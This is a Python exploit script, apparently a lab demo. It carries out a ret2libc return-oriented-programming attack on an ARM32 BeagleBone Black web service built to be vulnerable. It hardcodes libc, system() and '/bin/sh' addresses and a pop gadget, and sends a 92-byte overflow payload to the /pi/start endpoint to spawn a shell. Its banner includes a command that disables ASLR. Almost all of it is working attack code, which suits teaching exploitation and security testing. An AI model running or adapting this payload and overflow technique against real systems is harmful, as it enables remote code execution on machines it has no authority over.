#!/usr/bin/env python3
"""
get_shell.py — ret2libc exploit against /pi/start on ARM32 BBB

Verified addresses (no guessing):
  libc base:       0xb6d5b000  (from /proc/<pid>/maps)
  system() offset: 0x2e211     (from readelf, Thumb symbol → bit0=1 already set)
  /bin/sh offset:  0xcd660     (from strings -t x libc)
  gadget:          0x59cfc     pop {r0, r4, pc}  (ARM-mode 32-bit, in .text)

ROP chain:
  [ 'A' * 92         ]  ← fill config_buf (at r7+8) + frame to saved LR (at r7+100)
  [ pop_r0_r4_pc     ]  ← overwrite saved LR (bit0=0 → Thumb epilogue switches to ARM)
  [ binsh_addr       ]  ← → r0 (first arg to system)
  [ junk             ]  ← → r4 (discarded)
  [ system_addr      ]  ← → pc (system(); bit0=1 → ARM gadget switches back to Thumb)

Note on gadget validity:
  0x593e4 was the SECOND halfword of Thumb-2 LDRB.W — not an instruction start.
  0x159a4 was in ELF pre-text metadata (non-executable) — segfault.
  0x59cfc: ARM-mode context confirmed by surrounding instructions (ldrbcs, strbcs).
    e8bd8011 in ARM = ldmia sp!, {r0, r4, pc} = pop {r0, r4, pc} ✓
    e8bd8011 in Thumb = 0x8011 first → STRH (wrong!) — must NOT set bit0.

Shell appears in the BBB SSH terminal where ./rop-webservice was started.
"""

import sys, os, struct, requests
from urllib.parse import urlparse

VENV = os.path.join(os.path.dirname(__file__), '..', 'exploit-env',
                    'lib', 'python3.12', 'site-packages')
sys.path.insert(0, VENV)

def parse_target(raw: str) -> str:
    """Validate and normalise the target URL using urllib.parse.

    Accepts http[s]://<ipv4-or-ipv6-or-host>[:<port>] and returns it
    with any trailing slash stripped.  Raises SystemExit on bad input.
    """
    try:
        p = urlparse(raw)
        port = p.port   # triggers ValueError for out-of-range ports
    except ValueError as e:
        sys.exit(f'[-] Invalid TARGET URL: {e}')

    if p.scheme not in ('http', 'https'):
        sys.exit(f'[-] TARGET must start with http:// or https://  (got: {raw!r})')

    if not p.hostname:
        sys.exit(f'[-] TARGET has no host: {raw!r}')

    return raw.rstrip('/')


if len(sys.argv) != 2:
    prog = os.path.basename(sys.argv[0])
    sys.exit(f'Usage: {prog} <target-url>\n  e.g. {prog} http://192.168.7.2:8080')

TARGET = parse_target(sys.argv[1])

# Exact addresses from live process
LIBC_BASE = 0xb6d5b000
SYSTEM    = LIBC_BASE + 0x2e211  # 0xb6d89211 — Thumb, bit0 already set
BINSH     = LIBC_BASE + 0xcd660  # 0xb6e28660
GADGET    = LIBC_BASE + 0x59cfc  # 0xb6db4cfc — pop {r0, r4, pc} — ARM mode, bit0=0

OFFSET = 92  # config_buf at r7+8, saved LR at r7+100 → 92 bytes

def build_payload():
    payload  = b'A' * OFFSET
    payload += struct.pack('<I', GADGET)   # overwrite saved LR (bit0=0 → ARM mode)
    payload += struct.pack('<I', BINSH)    # → r0 ("/bin/sh")
    payload += b'JUNK'                    # → r4 (discarded)
    payload += struct.pack('<I', SYSTEM)  # → pc (system(), bit0=1 → back to Thumb)
    return payload

BANNER = """
╔══════════════════════════════════════════════════════════════╗
║           get_shell.py — ARM32 ret2libc exploit              ║
╠══════════════════════════════════════════════════════════════╣
║  Prerequisites                                               ║
║                                                              ║
║  1. BBB connected to this machine (USB or Ethernet)          ║
║  2. ASLR disabled on BBB:                                    ║
║       echo 0 | sudo tee /proc/sys/kernel/randomize_va_space  ║
║  3. Terminal A — SSH into BBB and start the service:         ║
║       ssh <user>@<bbb-ip>                                    ║
║       cd ~/rop-vuln-webservice && ./rop-webservice           ║
║  4. Terminal B — run this script from the repo root:         ║
║       source exploit-env/bin/activate                        ║
║       python3 demos/get_shell.py http://<bbb-ip>:8080        ║
║                                                              ║
║  The shell appears in Terminal A (the BBB SSH session).      ║
╚══════════════════════════════════════════════════════════════╝
"""

def main():
    print(BANNER)
    try:
        r = requests.get(f'{TARGET}/pi/status', timeout=3)
        print(f'[+] Service alive: {r.json()}')
    except Exception as e:
        print(f'[-] Service not responding: {e}')
        sys.exit(1)

    payload = build_payload()
    print()
    print(f'[*] ROP chain:')
    print(f'    {"A"*92}  ← 92-byte padding to saved LR')
    print(f'    0x{GADGET:08x}  ← pop {{r0, r4, pc}} (ARM .text, libc+0x59cfc, bit0=0)')
    print(f'    0x{BINSH:08x}  ← "/bin/sh" string (libc+0xcd660) → r0')
    print(f'    {"JUNK":8}      ← junk → r4 (discarded)')
    print(f'    0x{SYSTEM:08x}  ← system() (libc+0x2e211, Thumb)  → pc')
    print(f'    total payload: {len(payload)} B')
    print()
    print(f'[*] Sending exploit → {TARGET}/pi/start …')
    print(f'[*] Shell will appear in the BBB SSH terminal.')

    try:
        requests.post(f'{TARGET}/pi/start', data=payload, timeout=5)
    except Exception as e:
        print(f'[*] ({type(e).__name__}) — system() is running, shell active on BBB')

if __name__ == '__main__':
    main()
